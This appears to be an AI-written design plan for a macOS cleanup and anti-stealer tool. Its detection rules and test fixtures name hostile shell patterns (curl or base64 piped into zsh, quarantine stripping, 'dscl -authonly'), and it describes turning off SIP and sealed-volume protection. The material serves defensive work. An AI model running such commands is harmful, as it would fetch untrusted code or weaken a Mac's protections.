# Research: Macximesed v1 — optimizer + behaviour watcher for macOS
**Date:** 2026-11-23
**Status:** Complete, waiting for Lao's approval
**Researcher:** Claude Code

## Question
How should we build a macOS 27 tool that (1) frees space and background resources in three risk tiers and (2) watches for stealer-style malware (AMOS) better than XProtect does, using only what an unsigned, personal build can do?

## Context
A typical 2026 AMOS infection starts with a pasted `echo <base64> | base64 -D | zsh` command. It stays on the Mac through root LaunchDaemons named to look like Apple's (`com.apple.accountsd.helper`, `com.apple.metadata.mds.worker`, as Mate Security reported in November 2026) and hidden `~/Library/Application Support/.com.apple.*` folders. XProtect often misses this pattern. Lao's choices, 2026-11-23:
- **Form:** a shared core with a CLI first, then a menu bar app.
- **Antivirus:** all four parts: persistence watch, paste-to-shell guard, download and app checks, live process watch.
- **Cleanup:** three tiers, Safe, Medium and Risky. Risky has to make you say yes more than twice.

## Findings

### Internal
- The folder was empty, with no docs, code or git yet.
- The machine runs macOS 27.0.1 (26A434), Xcode 27.2 and Swift 6.4.2 on arm64, with SIP, Gatekeeper and FileVault on.
- `/usr/bin/eslogger` is present. `eslogger --list-events` on this Mac includes `exec`, `fork`, `btm_launch_item_add` and `btm_launch_item_remove`, `create`, `rename`, `setextattr`/`deleteextattr` (quarantine stripping), `open` (keychain and browser-file reads), `tcc_modify`, `gatekeeper_user_override`, `xp_malware_detected`, `sudo`, `su`, `authentication`, `od_modify_password`, `profile_add`, `uipc_connect` and `screensharing_attach`. **It has no TCP or UDP connect event**, so network watching needs another source.

### External
- **eslogger** must run as root, and whichever process launched it (Terminal, or the daemon itself) needs Full Disk Access. It writes JSON Lines to stdout. Since macOS 13 it has exposed every NOTIFY event of Endpoint Security, so **we get Endpoint Security data without Apple's restricted entitlement** (man page; WWDC22 session 110345).
- **Endpoint Security entitlement:** a direct ES client needs `com.apple.developer.endpoint-security.client`, a restricted entitlement Apple grants by request. Reported waits range from months to over a year, and approvals are often for development only. **Decision: don't depend on it, use eslogger.** Cost: notify only, so we can **alert and kill afterwards, not block beforehand**. AUTH events (block-before-run) need the entitlement.
- **BTM:** since Ventura, login and background items live in `/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v*.btm`. `sudo sfltool dumpbtm` prints them, but the option is undocumented and its format can change. Wardle (2023) found the `btm_launch_item_add` ES event unreliable. **Plan: use the event and poll the dump as a backup**, and diff the plist folders as well.
- **Prior art:** Objective-See's BlockBlock (live persistence alerts, ES-based, GPL-3.0, cask 2.5.0) and KnockKnock (one-shot persistence list, 4.0.3) are open source at github.com/objective-see. They are good references for which locations to watch. **GPL-3.0: read them for ideas, don't copy code**, unless Macximesed is GPL too.
- **How AMOS behaves in 2025–2026:** ClickFix lures where you paste into Terminal (Microsoft, May 2026), now also through Script Editor (BleepingComputer and CybersecurityNews, Sep 2026). It shows a fake password dialog through `osascript`, or a plain bash prompt (Huntress). It checks the password with `dscl . -authonly` and saves it to a hidden file (Sophos). It strips xattrs from its second stage, then reads Keychain and browser data. Its domains and IPs rotate constantly (Unit 42), so **behaviour rules beat IOC lists**.
- **MalwareBazaar** `get_info` on a SHA-256 needs a free Auth-Key header (POST to `https://mb-api.abuse.ch/api/v1/`). Only the hash is sent, never the file.
- **swift-argument-parser:** the latest tag is **1.8.2** (from `git ls-remote`, 2026-11-23).
- **SMAppService.daemon(plistName:)** is the current way to install a root helper from an app; SMJobBless is legacy. A root daemon gets no TCC prompts, so Full Disk Access has to be granted to it by hand.

### Added 2026-11-23 (Lao: also remove unneeded apps, fix CPU/GPU timing, squeeze out all the performance)
- **Development Mac:** MacBook Air 13" M3 (Mac15,12), 4 P + 4 E cores, 16 GB, **no fan**. Low Power Mode is off. High Power Mode exists only on Max-chip MacBook Pros, so it isn't available here.
- **What typically uses the CPU:** games, WindowServer, Electron apps (several helper processes each), coreaudiod. A normal desktop runs several hundred launchd jobs.
- **Clocks can't be raised.** Apple Silicon has no supported way to overclock or set CPU/GPU frequencies. The OS chooses them. Low Power mode caps them, and `powermetrics` only *reads* them (Eclectic Light 2025–2026).
- **The M3 Air throttles.** With no fan it hits ~114 °C and then drops its clocks under sustained load (Tom's Hardware, Wccftech, 2024). Max Tech's thermal-pad mod plus a cooling dock brought it to about M3 Pro sustained scores (Notebookcheck). **The biggest CPU/GPU fix is physical cooling, not software.** Software helps by leaving more heat budget for the app you care about.
- **Software that actually helps:** kill or limit background hogs (Electron apps, idle helpers, indexers); push background apps to background QoS (`taskpolicy -b -p <pid>`, `renice`); Reduce Transparency and Reduce Motion to cut WindowServer GPU work; turn off App Nap for one app (per-app defaults) or for all apps (`NSAppSleepDisabled`, older key, unconfirmed on 27); Game Mode, which only turns on by itself for full-screen games (no forced switch); native arm64 builds instead of Rosetta.
- **Deleting apps:** GarageBand, iMovie, Keynote, Pages and Numbers are App Store apps and can be removed and downloaded again. Chess, Stocks, News and the rest of `/System/Applications` are on the **sealed system volume**. Removing them needs SIP off, Software Update puts them back, and they're only a few MB. **Not in any tier.** Turning SIP off would also weaken the antivirus half, and we can hide them instead.

### Added 2026-11-23, second round (Lao: research a full remake of macOS that is optimized and better for games; delete Apple system apps)
- **A full remake of macOS is not possible.** macOS is closed source. Apple publishes only part of XNU (APSL 2.0), without the drivers, Skywalk networking, WindowServer, Metal or the frameworks. Apple Silicon *can* boot a custom kernel in Permissive Security, but the open-source XNU is incomplete (Wi-Fi needs `wlan.skywalk.enable=0`), and every OS update resets it. Apple's license lets Mac owners use the system images, not redistribute them (Asahi docs). So we can't build or share a "better macOS". The realistic version is **stock macOS with every safe-to-extreme tweak applied as one profile**. That is what Macximesed already does, with a new Games module on top.
- **Running Windows games on a Mac in 2026:** Whisky stopped development in April 2025 and pointed users to CrossOver. CrossOver (paid, CodeWeavers) is the maintained route, built on Wine plus Apple's Game Porting Toolkit tech. Apple's Game Porting Toolkit itself is aimed at developers. I couldn't confirm a "GPTK 3". Cloud gaming such as GeForce NOW streams games, so heat on the Air doesn't matter.
- **Deleting system apps:** this needs SIP off **and** `csrutil authenticated-root disable` (sealed volume off), both typed by Lao in Recovery. No app can do that step itself. After that, the system volume has to be mounted read-write, the apps removed, and a new bootable snapshot made. This puts the Mac in an "unsupported and less secure state" (DISA STIG macOS 26 requires Authenticated Root on). Updates may put the apps back or fail. Whether FileVault must be off for this on Apple Silicon is **not confirmed**, so it gets checked on the machine before we build that part.

## Sources
| Source | URL | Key takeaway |
|---|---|---|
| eslogger(1) man page | https://keith.github.io/xcode-man-pages/eslogger.1.html | root + FDA, JSON Lines |
| WWDC22 110345 | https://developer.apple.com/videos/play/wwdc2022/110345 | eslogger exposes all ES NOTIFY events |
| Cybereason, eslogger blue teaming | https://cybereason.com/blog/blue-teaming-on-macos-with-eslogger | detection use of eslogger |
| Apple deployment guide, BTM | https://support.apple.com/guide/deployment/depdca572563 | `sfltool dumpbtm` |
| Eclectic Light, login items (Dec 2025) | https://eclecticlight.co/2025/12/03/manage-login-and-background-items/ | dumpbtm option undocumented |
| Wardle, DumpBTM | https://patreon.com/posts/77420730 | BTM store location; ES BTM event unreliable |
| BlockBlock | https://objective-see.org/products/blockblock.html | prior art, GPL-3.0 |
| KnockKnock | https://objective-see.org/products/knockknock | prior art, persistence enumeration |
| Apple forums, ES entitlement waits | https://developer.apple.com/forums/thread/841639 | slow, often dev-only |
| Apple forums, ES entitlement for open-source tool | https://developer.apple.com/forums/thread/820718 | same |
| Sophos, why AMOS matters | https://www.sophos.com/en-us/blog/why-amos-matters-the-macos-malware-stealing-data-at-scale | `dscl -authonly`, hidden .pass file |
| Unit 42, AMOS activity | https://unit42.paloaltonetworks.com/atomic-macos-amos-stealer-activity/ | IOCs rotate fast |
| Microsoft, ClickFix macOS (May 2026) | https://microsoft.com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers | paste-into-Terminal delivery |
| BleepingComputer, Script Editor ClickFix | https://www.bleepingcomputer.com/news/security/new-macos-stealer-campaign-uses-script-editor-in-clickfix-attack/amp/ | Terminal-free variant |
| Huntress, AMOS via ChatGPT/Grok | https://www.huntress.com/blog/amos-stealer-chatgpt-grok-ai-trust | bash password prompt, not osascript |
| Picus, AMOS analysis | https://www.picussecurity.com/resource/blog/atomic-stealer-amos-macos-threat-analysis?hs_amp=true | osascript fake dialogs |
| MalwareBazaar API | https://bazaar.abuse.ch/api/ | Auth-Key required |
| Apple forums, SMAppService | https://developer.apple.com/forums/thread/802443 | daemon install path |
| swift-argument-parser | https://github.com/apple/swift-argument-parser | 1.8.2 |
| Eclectic Light, power modes and CPU cores | https://eclecticlight.co/2025/01/16/how-low-power-mode-controls-cpu-cores/ | OS picks frequencies; Low Power caps them |
| Eclectic Light, CPU frequencies 2026 | https://eclecticlight.co/2026/04/13/cpu-core-frequencies-updated-for-all-current-apple-silicon-macs/ | powermetrics reads, can't set |
| Eclectic Light, Game Mode | https://eclecticlight.co/2023/10/17/what-does-game-mode-do/ | what Game Mode changes |
| Apple, Game Mode | https://support.apple.com/HT213658 | turns on automatically, full-screen games |
| Tom's Hardware, M3 Air 114 °C | https://www.tomshardware.com/laptops/macbooks/m3-macbook-air-hits-eye-popping-114-degrees-celsius-in-stress-test-and-didnt-melt | fanless throttling |
| Notebookcheck, M3 Air heatsink | https://www.notebookcheck.net/External-heatsink-helps-MacBook-Air-with-Apple-M3-achieve-significantly-better-performance.814308.0.html | cooling recovers sustained speed |
| MacRumors, Chess/Stocks on SSV | https://forums.macrumors.com/threads/cant-trash-the-chess-game-and-stocks-app-why.2384526 | sealed system volume |
| OSXDaily, App Nap | https://osxdaily.com/2014/05/13/disable | NSAppSleepDisabled |
| Apple XNU source | https://github.com/apple-oss-distributions/xnu | partial kernel only, APSL 2.0 |
| Asahi Linux, Apple Silicon intro | https://asahilinux.org/docs/platform/introduction/ | custom kernels allowed; no redistribution of system images |
| Eclectic Light, csrutil reference | https://eclecticlight.co/2024/08/21/controlling-system-integrity-protection-using-csrutil-a-reference/ | `authenticated-root disable` |
| DISA STIG macOS 26, V-277175 | https://www.stigviewer.com/stigs/apple_macos_26_tahoe/2026-02-11/finding/V-277175 | Authenticated Root required |
| MacRumors, Whisky ends | https://www.macrumors.com/2025/04/23/whisky-ends-mac-gaming-tool-crossover/ | use CrossOver |
| 9to5Mac, Windows games on Mac | https://9to5mac.com/2025/04/23/running-windows-games-on-mac-just-got-more-expensive/ | CrossOver is the maintained path |

## Recommendation
**Swift 6.4 package, macOS 27 only, three targets, built and run locally (no App Store, no ES entitlement):**

1. **`MacxCore`** (library, where all the logic lives and all of it is unit-tested)
   - `Persistence`: enumerate and snapshot LaunchDaemons and LaunchAgents (system and user), BTM, login items, cron/periodic, shell rc files, `/etc/hosts`, configuration profiles, browser extensions, and hidden dot-folders in `~/Library/Application Support`. Diff snapshots against a baseline.
   - `Rules`: a small, data-driven rule engine. The first rules are the AMOS ones:
     - a plist named `com.apple.*` that is not Apple-signed, or that lives outside `/System`;
     - `curl|wget … | (ba|z)sh` and `base64 -D | (ba|z)sh`;
     - `xattr -d com.apple.quarantine`/`-cr`;
     - `osascript` showing a dialog that asks for a password;
     - `dscl . -authonly` from a process that isn't Apple's;
     - a non-Apple process opening `login.keychain-db`, browser `Login Data`/`Cookies` or wallet folders;
     - a new ad-hoc-signed binary running from a hidden folder.
   - `FileCheck`: `codesign`/`SecStaticCode` signature and team ID, `spctl` assessment, notarization (stapled or online), quarantine xattr, SHA-256, optional MalwareBazaar lookup (hash only, key in Keychain), and a list of what a .pkg/.dmg/.app will install (pkg scripts, bundled LaunchDaemons, login items).
   - `Cleanup`: a catalogue of items, each tagged **Safe / Medium / Risky**, each with a size estimate, a dry run and an undo:
     - **Safe:** caches, logs, Trash, old Xcode DerivedData/Simulators/device support, Homebrew/npm/pip caches, leftovers from removed apps, Docker/OrbStack unused images (through their own CLIs). Files go to a dated quarantine folder first and are deleted after 7 days.
     - **Medium:** turn off chosen login and background items, Spotlight indexing on chosen volumes, Siri and analytics, reduced animations and transparency, Time Machine local snapshots. Every change is reversible through a stored "before" value.
     - **Risky:** e.g. sleepimage/hibernate mode, full Spotlight off, turning off Apple daemons through `launchctl disable`, purging all snapshots. **Three separate confirmations** (show what breaks, then type the item's name, then a final yes after a 5-second wait) and an automatic undo script. Never touches SIP, Gatekeeper, XProtect, FileVault or the firewall.
   - `Apps`:
     - Lists every app with its size, its last-used date (Spotlight `kMDItemLastUsedDate`, falling back to `~/Library/Application Support` mtimes), whether it's arm64 or Intel (Rosetta), its auto-start items and its leftovers.
     - Marks an app "unused" when it hasn't opened in 90 days (you can change that).
     - Uninstalling moves the app plus its Library leftovers (caches, prefs, containers, LaunchAgents, helpers) into the dated quarantine folder, so it can be undone for 7 days. Apple's App Store apps (GarageBand, iMovie, iWork) are included. Apps on the sealed system volume can only be hidden, never deleted.
   - `Performance` ("Boost"):
     - Live view of CPU/GPU load, P/E-core frequency and thermal state (`powermetrics` with sudo, `pmset -g therm`), so you can see when the Air is throttling.
     - Top hogs, with Quit / Limit actions. Limit is background QoS through `taskpolicy -b`, plus `renice`.
     - **Boost profile:** pauses chosen background apps and login items, lowers the rest to background QoS, turns off App Nap for the focus app, Reduce Transparency/Motion, Low Power Mode off, Spotlight indexing paused, caffeinate. It puts everything back when you turn it off.
     - Tiers:
       - **Safe:** view-only, plus Quit and Limit.
       - **Medium:** the Boost profile, App Nap and visual effects.
       - **Risky:** `launchctl disable` of Apple background daemons from a curated list (photoanalysisd, mediaanalysisd, Siri/analytics, News/Stocks widgets, game-center), hibernatemode 0, Power Nap off. Each one comes with its undo, and the triple confirmation applies.
     - It warns that clocks can't be raised and that real sustained gains on a fanless Air come from cooling.
   - `Games`:
     - Each game gets a profile: launching it turns Boost on, checks it's arm64 and not Rosetta, fixes the Game Mode conditions (full screen, focus), and offers the Metal Performance HUD (FPS, GPU time) as an option.
     - A heat/throttle graph for the session.
     - For each game, the best way to run it: native, CrossOver, GeForce NOW or Steam. It detects which of these are installed.
     - Turning Boost off is guaranteed when the game quits.
   - `Extreme` (a fourth level above Risky, **off by default**, its own command `macx extreme`):
     - Deletes apps from the sealed system volume (Chess, Stocks, News, Tips, etc.).
     - It walks you through the Recovery steps (you type `csrutil disable` and `csrutil authenticated-root disable` yourself), then mounts the volume, keeps a list of what it removed, and makes the new snapshot. `macx extreme restore` puts the protections back.
     - The same triple confirmation, plus a banner on every `macx` command while SIP is off, saying the antivirus half is weaker.
     - **Best done on a freshly installed Mac.**
2. **`macx`** CLI (ArgumentParser 1.8.2): `macx apps [--unused] [--remove <app>]`, `macx boost [on|off|status]`, `macx top`, `macx scan`, `macx persist [--baseline|--diff]`, `macx check <file>`, `macx clean [--tier safe|medium|risky] [--dry-run]`, `macx undo <id>`, `macx watch` (runs eslogger in the foreground, needs sudo + FDA for the terminal).
3. **`macxd`** root daemon (installed later by the app via SMAppService): runs `eslogger exec fork create rename deleteextattr setextattr open btm_launch_item_add tcc_modify gatekeeper_user_override sudo authentication`, feeds the rule engine, polls BTM every 60 s, and watches network with `nettop`/`lsof` polling for the flagged processes. It sends alerts to the app over XPC. A confirmed-bad process can be suspended (SIGSTOP) while you decide.
4. **Macximesed.app** menu bar (SwiftUI, phase 2): status, alerts with Kill / Allow / Trash-and-undo actions, scan, cleanup with tiers.

**Honest limits:** this does not replace XProtect (keep it on). It also can't block before something runs without Apple's entitlement, so it catches things *at or right after* they happen and stops them. For AMOS that is still before the theft finishes: the fake password prompt, the quarantine strip and the persistence write all come first.

**Order (Lao, 2026-11-23: easiest to hardest, and each step needs only steps already built):**
1. Package skeleton, `macx` CLI, and `macx scan`: a read-only report covering protections, top hogs, disk use and thermal state. No root.
2. Undo store + quarantine folder, then the **Safe cleanup** tier, which is the first thing to use them.
3. **Apps:** list, mark unused, uninstall with leftovers (uses step 2).
4. **Persistence snapshot + diff + AMOS rules**, as a one-shot scan.
5. **File check**: signature, notarization, quarantine, hash, what it installs. MalwareBazaar is optional.
6. **Paste-to-shell guard**, static: scans shell history and the clipboard for curl|zsh and base64|zsh (uses the rule engine from step 4).
7. **Boost + throttle view + Medium tier** (uses the undo store from step 2).
8. **Games** profiles (use Boost from step 7).
9. **Live watch** via eslogger. Needs root + Full Disk Access, and runs the step 4 and 6 rules live.
10. **Risky tier** with the triple confirmation.
11. Root daemon (SMAppService) + **menu bar app**.
12. **Extreme** (system app deletion with SIP off). Last, ideally on a freshly installed Mac.

## Test plan sketch
- [ ] `PersistenceSnapshot` parses a fixture LaunchDaemon plist into label, program, run-as and path.
- [ ] Rule `fake-apple-label` fires on a fixture copy of `com.apple.accountsd.helper.plist` whose program is a bash loop in `~/Library/Application Support/.com.apple.accountsd`, and does not fire on a real `/System/Library/LaunchDaemons/com.apple.*` entry.
- [ ] Rule `paste-to-shell` fires on `echo '…' | base64 -D | zsh` and `curl -sL https://x/update.sh | zsh` exec events (eslogger JSON fixtures), and does not fire on `brew install`.
- [ ] Rule `quarantine-strip` fires on `deleteextattr com.apple.quarantine` from a non-Apple process.
- [ ] The diff reports exactly one added item when a fixture snapshot gains one plist.
- [ ] Cleanup: the Safe tier's dry run lists items with sizes and changes nothing; running it moves files to the quarantine folder and `undo` restores them byte-identically (in a temp HOME).
- [ ] The Risky tier refuses to act after fewer than three confirmations (injected confirmer).
- [ ] Apps: an app whose last-used date is 120 days old is marked unused at the 90-day threshold; an app in `/System/Applications` is never offered for removal.
- [ ] Uninstall moves the app and its matching leftovers (by bundle ID) into quarantine and leaves other apps' files alone (temp HOME fixture).
- [ ] Boost on, then off, restores every changed setting to its stored "before" value (injected system-settings fake).
- [ ] The eslogger line parser handles truncated or partial JSON lines without crashing.

## Risks & unknowns
- `sfltool dumpbtm` format is undocumented and may change in 27.x, so the parser has to be tolerant and fall back to plist folders.
- I haven't checked eslogger's CPU cost with `open` events on this Mac. `open` is very noisy, so we may need to filter by path in-process or drop it.
- Without a notifying ES event for network connections, network watching is polling and can miss short connections.
- Self-protection: malware with root can kill `macxd`, so it can only make that loud (a heartbeat in the menu bar app).
- A monitor installed on a Mac that's already infected can be blinded. After an infection, erasing and reinstalling stays the real fix.
- Distribution: an unsigned build runs only on your own Mac. Sharing it needs a Developer ID ($99/yr) and notarization.
- The MalwareBazaar key needs you to sign up with abuse.ch. This part is optional.

## Next steps
- [ ] Lao approves or changes this plan.
- [ ] `git init`, Swift package skeleton, `docs/` layout, README.
- [ ] Write `specs/macximesed-v1.md`, then TDD, starting with the persistence snapshot + AMOS rules.
